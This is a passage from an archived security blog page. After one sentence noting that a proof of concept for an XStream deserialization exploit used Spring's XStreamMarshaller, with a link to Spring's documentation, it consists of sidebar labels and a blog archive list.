The original PoC Alvaro created for XStream used the Spring Framework [XStreamMarshaller](http://web.archive.org/web/20140204133306/http%3A//docs.spring.io/spring-ws/sites/1.5/apidocs/org/springframework/oxm/xstream/XStreamMarshaller.html) which provides this guidance [at the end of this doc](http://web.archive.org/web/20140204133306/http%3A//docs.spring.io/spring/docs/3.0.x/reference/oxm.html):

[![](http://web.archive.org/web/20140204133306im_/http://4.bp.blogspot.com/-D__eQhI_cxw/UrY4xsrri9I/AAAAAAAAFQg/p53OQwhLcbc/s1600/Screen+Shot+2013-12-22+at+00.55.41.png)](http://web.archive.org/web/20140204133306/http%3A//4.bp.blogspot.com/-D__eQhI_cxw/UrY4xsrri9I/AAAAAAAAFQg/p53OQwhLcbc/s1600/Screen%2BShot%2B2013-12-22%2Bat%2B00.55.41.png)

Posted by

[Dinis Cruz](http://web.archive.org/web/20140204133306/https%3A//plus.google.com/101331715302361457274 "author profile")

at

[02:48](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html "permanent link")

[![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/icon18_email.gif)](http://web.archive.org/web/20140204133306/http%3A//www.blogger.com/email-post.g?blogID=7061568054540301299&postID=2338628692747425877 "Email Post")

[![](http://web.archive.org/web/20140204133306im_/http://img2.blogblog.com/img/icon18_edit_allbkg.gif)](http://web.archive.org/web/20140204133306/http%3A//www.blogger.com/post-edit.g?blogID=7061568054540301299&postID=2338628692747425877&from=pencil "Edit Post")

[Email This](http://web.archive.org/web/20140204133306/http%3A//www.blogger.com/share-post.g?blogID=7061568054540301299&postID=2338628692747425877&target=email "Email This")[BlogThis!](http://web.archive.org/web/20140204133306/http%3A//www.blogger.com/share-post.g?blogID=7061568054540301299&postID=2338628692747425877&target=blog "BlogThis!")[Share to Twitter](http://web.archive.org/web/20140204133306/http%3A//www.blogger.com/share-post.g?blogID=7061568054540301299&postID=2338628692747425877&target=twitter "Share to Twitter")[Share to Facebook](http://web.archive.org/web/20140204133306/http%3A//www.blogger.com/share-post.g?blogID=7061568054540301299&postID=2338628692747425877&target=facebook "Share to Facebook")

Labels:
[DefCon](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/DefCon),
[Eclipse](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Eclipse),
[Java](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Java),
[REST](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/REST),
[Security](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Security)

[Post a Comment](http://web.archive.org/web/20140204133306/http%3A//www.blogger.com/comment.g?blogID=7061568054540301299&postID=2338628692747425877)

[Newer Post](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/trying-to-add-evil-bit-to.html "Newer Post")

[Older Post](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/executing-eclipse-plugin-junit-tests-in.html "Older Post")

[Home](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/)

Subscribe to:
[Post Comments (Atom)](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/feeds/2338628692747425877/comments/default)

## Search

Loading...

[![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/icon18_wrench_allbkg.png)](//web.archive.org/web/20140204133306/http%3A//www.blogger.com/rearrange?blogID=7061568054540301299&widgetType=CustomSearch&widgetId=CustomSearch1&action=editWidget§ionId=sidebar-right-1 "Edit")

## Support this blog using Flattr

[![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/icon18_wrench_allbkg.png)](//web.archive.org/web/20140204133306/http%3A//www.blogger.com/rearrange?blogID=7061568054540301299&widgetType=HTML&widgetId=HTML1&action=editWidget§ionId=sidebar-right-1 "Edit")

## Subscribe using RSS

![](http://web.archive.org/web/20140204133306im_/http://img2.blogblog.com/img/widgets/arrow_dropdown.gif)
![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/icon_feed12.png)
Posts

[![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/widgets/subscribe-netvibes.png)](http://web.archive.org/web/20140204133306/http%3A//www.netvibes.com/subscribe.php?url=http%3A%2F%2Fblog.diniscruz.com%2Ffeeds%2Fposts%2Fdefault)
[![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/widgets/subscribe-yahoo.png)](http://web.archive.org/web/20140204133306/http%3A//add.my.yahoo.com/content?url=http%3A%2F%2Fblog.diniscruz.com%2Ffeeds%2Fposts%2Fdefault)
[![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/icon_feed12.png)
Atom](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/feeds/posts/default)

![](http://web.archive.org/web/20140204133306im_/http://img2.blogblog.com/img/widgets/arrow_dropdown.gif)
![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/icon_feed12.png)
Posts

![](http://web.archive.org/web/20140204133306im_/http://img2.blogblog.com/img/widgets/arrow_dropdown.gif)
![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/icon_feed12.png)
Comments

[![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/widgets/subscribe-netvibes.png)](http://web.archive.org/web/20140204133306/http%3A//www.netvibes.com/subscribe.php?url=http%3A%2F%2Fblog.diniscruz.com%2Ffeeds%2F2338628692747425877%2Fcomments%2Fdefault)
[![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/widgets/subscribe-yahoo.png)](http://web.archive.org/web/20140204133306/http%3A//add.my.yahoo.com/content?url=http%3A%2F%2Fblog.diniscruz.com%2Ffeeds%2F2338628692747425877%2Fcomments%2Fdefault)
[![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/icon_feed12.png)
Atom](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/feeds/2338628692747425877/comments/default)

![](http://web.archive.org/web/20140204133306im_/http://img2.blogblog.com/img/widgets/arrow_dropdown.gif)
![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/icon_feed12.png)
Comments

[![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/icon18_wrench_allbkg.png)](//web.archive.org/web/20140204133306/http%3A//www.blogger.com/rearrange?blogID=7061568054540301299&widgetType=Subscribe&widgetId=Subscribe1&action=editWidget§ionId=sidebar-right-1 "Edit")

## Labels

[AngularJS](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/AngularJS)
(12)

[AppSensor](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/AppSensor)
(1)

[ASP.NET MVC](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/ASP.NET%20MVC)
(5)

[Azure](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Azure)
(11)

[BDD](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/BDD)
(2)

[Book](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Book)
(5)

[Books](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Books)
(1)

[CatNet](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/CatNet)
(17)

[Checkmarx](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Checkmarx)
(18)

[Chrome](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Chrome)
(5)

[Code Cafe](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Code%20Cafe)
(1)

[Code Club](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Code%20Club)
(5)

[CodingLab](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/CodingLab)
(4)

[Company Tips](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Company%20Tips)
(1)

[Contract Work](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Contract%20Work)
(8)

[DefCon](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/DefCon)
(9)

[Design](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Design)
(16)

[Development](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Development)
(7)

[Diagram](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Diagram)
(1)

[Down memory lane](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Down%20memory%20lane)
(1)

[Eclipse](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Eclipse)
(21)

[Education](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Education)
(3)

[ESAPI](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/ESAPI)
(3)

[ESTAPI](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/ESTAPI)
(3)

[FluentSharp](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/FluentSharp)
(14)

[Football](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Football)
(1)

[Fortify](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Fortify)
(8)

[Frameworks](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Frameworks)
(3)

[Funny](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Funny)
(2)

[Future Self](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Future%20Self)
(3)

[Fuzzing](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Fuzzing)
(6)

[FxCop](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/FxCop)
(1)

[Gamification](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Gamification)
(3)

[Git](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Git)
(32)

[GitHub](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/GitHub)
(35)

[Google](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Google)
(10)

[Groovy](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Groovy)
(8)

[Half-baked Idea](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Half-baked%20Idea)
(16)

[IBM](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/IBM)
(30)

[IKVM](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/IKVM)
(1)

[Java](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Java)
(25)

[Javascript](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Javascript)
(3)

[Jni4Net](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Jni4Net)
(13)

[JRebel](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/JRebel)
(4)

[JsTestDriver](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/JsTestDriver)
(2)

[JustCode](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/JustCode)
(5)

[Karma](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Karma)
(1)

[Karma Points](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Karma%20Points)
(1)

[KarmaJS](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/KarmaJS)
(6)

[Kernel](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Kernel)
(1)

[LeanPub](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/LeanPub)
(1)

[Learn-to-Code](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Learn-to-Code)
(3)

[Linux](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Linux)
(2)

[Live Writer](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Live%20Writer)
(6)

[Markdown](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Markdown)
(3)

[Mass Assignment](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Mass%20Assignment)
(2)

[Maths](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Maths)
(1)

[MediaWiki](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/MediaWiki)
(1)

[Minecraft](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Minecraft)
(3)

[Misc](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Misc)
(1)

[MVC](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/MVC)
(4)

[NDepend](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/NDepend)
(3)

[NGit](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/NGit)
(5)

[NodeJS](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/NodeJS)
(4)

[NuGet](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/NuGet)
(5)

[NUnit](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/NUnit)
(7)

[O2](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/O2)
(1)

[O2 Platform](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/O2%20Platform)
(212)

[O2 Platform Tool](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/O2%20Platform%20Tool)
(25)

[O2 Script](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/O2%20Script)
(2)

[O2Platform](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/O2Platform)
(13)

[OSx](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/OSx)
(6)

[OunceLabs](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/OunceLabs)
(13)

[OWASP](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/OWASP)
(76)

[OWASP MIA](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/OWASP%20MIA)
(14)

[Patterns](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Patterns)
(1)

[PCI](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/PCI)
(1)

[PDFs](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/PDFs)
(17)

[Philosophy](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Philosophy)
(75)

[PostSharp](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/PostSharp)
(1)

[Presentation](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Presentation)
(2)

[Privacy](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Privacy)
(1)

[Question](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Question)
(5)

[Rant](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Rant)
(31)

[Raspberry PI](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Raspberry%20PI)
(2)

[RazorSharp](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/RazorSharp)
(4)

[REPL](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/REPL)
(54)

[REST](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/REST)
(6)

[Roslyn](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Roslyn)
(14)

[Sandboxing](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Sandboxing)
(1)

[SAST](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/SAST)
(30)

[Security](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Security)
(44)

[Security as BRAKES](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Security%20as%20BRAKES)
(1)

[Security as TAX](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Security%20as%20TAX)
(24)

[Security Innovation](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Security%20Innovation)
(4)

[Selenium](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Selenium)
(10)

[Services](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Services)
(5)

[Simple Microsoft](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Simple%20Microsoft)
(5)

[Simplicity](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Simplicity)
(1)

[Sport](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Sport)
(1)

[Spring Framework](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Spring%20Framework)
(17)

[TeamCity](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/TeamCity)
(9)

[TeamMentor](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/TeamMentor)
(216)

[TeamMentor Security](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/TeamMentor%20Security)
(12)

[Testing](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Testing)
(10)

[To add to O2](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/To%20add%20to%20O2)
(6)

[To Read](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/To%20Read)
(9)

[Tools](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Tools)
(40)

[Trillions](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Trillions)
(6)

[Unit Tests](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Unit%20Tests)
(11)

[UnitTests](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/UnitTests)
(2)

[Video](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Video)
(22)

[Visualization](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Visualization)
(9)

[VisualStudio](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/VisualStudio)
(28)

[WAF](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/WAF)
(2)

[WatiN](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/WatiN)
(2)

[WebGoat .NET](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/WebGoat%20.NET)
(2)

[WebStorm](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/WebStorm)
(4)

[WinAPI](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/WinAPI)
(25)

[Windows 8](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Windows%208)
(5)

[Wish lists](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/Wish%20lists)
(1)

[WPF](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/WPF)
(3)

[xkcd](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/xkcd)
(1)

[XmlDecoder](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search/label/XmlDecoder)
(3)

[![](http://web.archive.org/web/20140204133306im_/http://img1.blogblog.com/img/icon18_wrench_allbkg.png)](//web.archive.org/web/20140204133306/http%3A//www.blogger.com/rearrange?blogID=7061568054540301299&widgetType=Label&widgetId=Label1&action=editWidget§ionId=sidebar-right-1 "Edit")

## Google+ Badge

| Blog Archive  * ►   [2014](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search?updated-min=2014-01-01T00:00:00Z&updated-max=2015-01-01T00:00:00Z&max-results=19)   (19)   + ►     [February](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2014_02_01_archive.html)     (2)   + ►     [January](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2014_01_01_archive.html)     (17)  * ▼   [2013](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search?updated-min=2013-01-01T00:00:00Z&updated-max=2014-01-01T00:00:00Z&max-results=50)   (368)   + ▼     [December](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013_12_01_archive.html)     (26)     - [Bill Gates would had changed to world more if he h...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/bill-gates-would-had-changed-to-world.html)     - [How to create (using Eclipse) JavaDocs that looks ...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/how-to-create-using-eclipse-javadocs.html)     - [Just donated £50 to Wikipedia](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/just-donated-50-to-wikipedia.html)     - [The power of not being in power (and being ignored...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/the-power-of-not-being-in-power-and.html)     - [3 Patterns for deserialising Xml into Objects (1 g...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/3-patterns-for-deserialising-xml-into.html)     - [Trying to add an 'EVIL bit' to java.lang.String (a...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/trying-to-add-evil-bit-to.html)     - [XStream "Remote Code Execution" exploit on code fr...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html)     - [Executing Eclipse Plugin JUnit tests in real-time ...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/executing-eclipse-plugin-junit-tests-in.html)     - [Groovy Script to create a view that shows the imag...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/groovy-script-to-create-view-that-shows.html)     - [Football group photo from last Saturday's game in ...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/football-group-photo-from-last.html)     - [Adding and using new API methods, that are consume...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/adding-and-using-new-api-methods-that.html)     - [Using JRebel to HotSwap new Static String fields i...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/using-jrebel-to-hotswap-new-static.html)     - [Installing, compiling and failing to use DCE VM fo...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/installing-compiling-and-failing-to-use.html)     - [Installing Gradle on OSX](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/installing-gradle-on-osx.html)     - [What if minecraft was open source? (it would be an...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/what-if-minecraft-was-open-source-it.html)     - [The hidden costs of closed words (in reference to ...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/the-hidden-costs-of-closed-words-in.html)     - [Blogger search is still broken and workaround to c...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/blogger-search-is-still-broken-and.html)     - [How to word-wrap a word without breaking it (when ...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/how-to-word-wrap-word-without-breaking.html)     - [Juno probe captures movie of Earth-Moon 'dance' (a...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/juno-probe-captures-movie-of-earth-moon.html)     - [Webcast on TeamMentor integration with Checkmarx](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/webcast-on-teammentor-integration-with.html)     - [What really hurts ... is not being defended by you...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/what-really-hurts-is-not-being-defended.html)     - [Blogging is like speaking to my 'Future Self'](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/blogging-is-like-speaking-to-my-future.html)     - [Got 3 Raspberry PIs on the post from @CodeClub](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/got-3-raspberry-pis-on-post-from.html)     - [High-Res images of TeamMentor's Fortify integratio...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/high-res-images-of-teammentors-fortify.html)     - [Setting up a CraftBukkit based Minecraft server on...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/setting-up-craftbukkit-based-minecraft.html)     - [Installing Eclipse Plugin Builder, accessing Eclip...](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013/12/installing-eclipse-plugin-builder.html)   + ►     [November](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013_11_01_archive.html)     (12)   + ►     [October](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013_10_01_archive.html)     (4)   + ►     [September](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013_09_01_archive.html)     (24)   + ►     [August](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013_08_01_archive.html)     (21)   + ►     [July](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013_07_01_archive.html)     (11)   + ►     [June](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013_06_01_archive.html)     (45)   + ►     [May](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013_05_01_archive.html)     (47)   + ►     [April](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013_04_01_archive.html)     (39)   + ►     [March](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013_03_01_archive.html)     (53)   + ►     [February](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013_02_01_archive.html)     (20)   + ►     [January](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2013_01_01_archive.html)     (66)  * ►   [2012](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search?updated-min=2012-01-01T00:00:00Z&updated-max=2013-01-01T00:00:00Z&max-results=50)   (426)   + ►     [December](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012_12_01_archive.html)     (56)   + ►     [November](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012_11_01_archive.html)     (74)   + ►     [October](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012_10_01_archive.html)     (105)   + ►     [September](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012_09_01_archive.html)     (14)   + ►     [August](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012_08_01_archive.html)     (8)   + ►     [July](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012_07_01_archive.html)     (4)   + ►     [June](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012_06_01_archive.html)     (31)   + ►     [May](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012_05_01_archive.html)     (53)   + ►     [April](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012_04_01_archive.html)     (76)   + ►     [March](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012_03_01_archive.html)     (4)   + ►     [January](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2012_01_01_archive.html)     (1)  * ►   [2011](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search?updated-min=2011-01-01T00:00:00Z&updated-max=2012-01-01T00:00:00Z&max-results=50)   (71)   + ►     [December](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2011_12_01_archive.html)     (1)   + ►     [November](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2011_11_01_archive.html)     (13)   + ►     [October](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2011_10_01_archive.html)     (11)   + ►     [August](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2011_08_01_archive.html)     (4)   + ►     [July](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2011_07_01_archive.html)     (21)   + ►     [June](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2011_06_01_archive.html)     (5)   + ►     [May](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2011_05_01_archive.html)     (4)   + ►     [April](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2011_04_01_archive.html)     (1)   + ►     [March](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2011_03_01_archive.html)     (4)   + ►     [February](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2011_02_01_archive.html)     (6)   + ►     [January](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2011_01_01_archive.html)     (1)  * ►   [2010](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/search?updated-min=2010-01-01T00:00:00Z&updated-max=2011-01-01T00:00:00Z&max-results=50)   (65)   + ►     [November](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2010_11_01_archive.html)     (8)   + ►     [October](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2010_10_01_archive.html)     (15)   + ►     [September](http://web.archive.org/web/20140204133306/http%3A//blog.diniscruz.com/2010_09_01_archive.html)     (3)   + ►     